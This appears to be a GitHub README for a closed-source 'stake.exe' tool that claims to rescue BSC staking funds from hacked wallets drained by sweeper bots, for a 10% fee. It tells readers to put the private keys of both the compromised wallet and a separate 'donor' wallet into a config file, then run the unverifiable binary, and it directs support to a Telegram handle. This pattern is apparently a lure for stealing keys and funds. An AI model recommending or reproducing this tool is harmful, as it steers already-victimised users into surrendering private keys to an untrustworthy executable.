# [Читать на русском](https://github.com/hom9kfun/autowithdraw-bypass-bsc-stake/blob/main/README_RU.md)

# 🛡️ Program for Bypassing Automatic Withdrawal of Funds from Hacked Wallets

This program will help you withdraw your funds from the automatic withdrawal that hackers set up on hacked wallets. If you replenish funds for the commission and they are instantly withdrawn to another wallet, leaving you no time to act - this script bypasses such situations, charging only 10% of the total staking withdrawal amount. In the future, if the program is in demand, I plan to reduce the commission to 1%.

## ⚙️ Getting Started

### 1. Setting up `config.json`

Before running the program, fill in the `config.json` file as follows:

- **`private_key_account`**: The private key of the wallet from which you want to withdraw the stake.
- **`private_key_donor`**: The private key of the donor wallet from which BNB will be debited for transactions.
- **`contract_stake_address`**: The contract address where the stake is located (e.g. Pancake Pool).
- **`contract_token_address`**: The contract address of the token that is in the stake (e.g. CAKE Token).
- **`recipient_address`**: The recipient address to which the tokens from the stake will be withdrawn.
- **`transfer_gas_price`**: Fee amount (in Gwei) for a token transfer transaction (default: 1 Gwei).
- **`stake_gas_price`**: Fee amount (in Gwei) for a stake withdrawal transaction (default: 1 Gwei).
- **`stake_balance`**: Your staking balance in the usual format (e.g. if you have 100 BUSD staked, just enter `100`. If the amount is less than 1, separate it with a dot, e.g. `0.523`).

### Example `config.json`:
```json
{
  "private_key_account": "ВашПриватныйКлюч",
  "private_key_donor": "ПриватныйКлючДонора",
  "contract_stake_address": "0x42D6F9c0778De4407E5C1a4371db527564AcB987",
  "contract_token_address": "0xe9e7cea3dedca5984780bafc599bd69add087d56",
  "recipient_address": "0x710023662f3e43e0712e679C121440fC8365B519",
  "transfer_gas_price": 1,
  "stake_gas_price": 1,
  "stake_balance": 100
}
```

### 🚀 Launch

After filling in the `config.json` file, you can launch the `stake.exe` program. If all parameters are specified correctly, you will see your funds on the specified wallet. 🥳

### 🔒 Safety of use

- **VirusTotal check**: Make sure the `stake.exe` file is safe by checking it on [VirusTotal](https://www.virustotal.com/). 🔍
- **Source code**: Unfortunately, for obvious reasons, the source code of the program is not available. ❌

### 📞 Support

If the program did not work for you or you have other questions, do not hesitate to write to me in Telegram: [@lololo45353](https://t.me/lololo45353). I will try to help you! 💬

### 📅 Future updates

- In the near future, I plan to release programs to bypass the automatic withdrawal of **NFT** and regular tokens. 🎉
- Other **EVM networks** will also be added. Stay tuned! 🔔

### ⚠️ Important

Use the program at your own risk. Automation of cryptocurrency transactions always carries the risk of losing funds. 🔥
